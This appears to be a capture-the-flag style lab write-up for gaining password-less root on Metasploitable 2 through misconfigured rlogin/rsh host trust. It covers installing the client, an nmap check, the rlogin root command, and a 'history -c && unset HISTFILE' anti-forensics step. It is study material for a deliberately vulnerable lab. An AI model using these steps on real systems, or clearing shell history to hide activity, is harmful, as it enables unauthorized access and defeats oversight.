# üö© Rlogin & Rsh Misconfiguration Exploit
**Target:** Metasploitable 2 | **Port:** 513 (Login), 514 (Shell) | **Difficulty:** Low

## üìù Description
The Berkeley R-commands (`rlogin`, `rsh`, `rcp`) are legacy remote administration tools that rely on "trusted host" relationships rather than strong encryption or password authentication. This exploit leverages a misconfigured `.rhosts` or `/etc/hosts.equiv` file that allows password-less root access from trusted networks.

## üõë Pre-requisites & Troubleshooting
**Critical Warning: The "Ghost IP" Conflict**
If using a Bridged Adapter in VirtualBox, you may encounter an IP conflict where a physical device (router/phone) grabs the target IP.
* **Symptom:** `ping` works, but `nmap -p 513` shows "closed".
* **Fix:** Isolate the lab using **VirtualBox NAT Network** (CIDR `10.0.2.0/24`).

## üõ†Ô∏è Step-by-Step Exploitation

### 1. Install Legacy Dependencies
Modern Kali Linux does not include the insecure `rsh` binaries by default.
```bash
sudo apt update && sudo apt install rsh-redone-client

### 2. Verify the Service
```bash
nmap -p 513 <target_ip>

#output must be: 513/tcp OPEN login

### 3. Execute the login(Privileged Port)
Concept: The server trusts connections originating from "Privileged Ports" (1-1023). Only root can bind to these ports. Standard user connections will fail or prompt for a password.
```bash
sudo rlogin -l root <target_ip>

### 4. Post Exploitation
Once connected, verify root access and clean up artifacts.

```bash
whoami
#Output: root

#Anti-forensics
```bash
history -c && unset HISTFILE

üß† Lessons Learned
Trust vs. Auth: This vulnerability exploits a trust relationship (IP-based), not a weak password.

Privileged Ports: Understanding why sudo is required (ports <1024) is key to understanding Unix trust models.

Network Isolation: Troubleshooting the "Ghost IP" taught the importance of network segmentation (NAT Networks) in lab environments.
